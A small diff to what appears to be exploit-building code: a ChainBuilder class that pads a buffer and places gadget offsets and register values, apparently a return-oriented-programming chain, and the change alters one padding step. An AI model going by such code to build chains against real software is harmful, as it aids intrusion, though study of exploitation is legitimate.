@@ -311,8 +311,7 @@ class ChainBuilder {
 			// Read r3
 			Util.pad(0x10, SF)
 			+ Util.int64(0x0, this.offsets.gadgetMod2)
-			+ Util.pad(0x60, AA)
-			+ Util.int64(0x0, r31in)
+			+ Util.pad(0x68, AA)
 		
 			//////////
 			
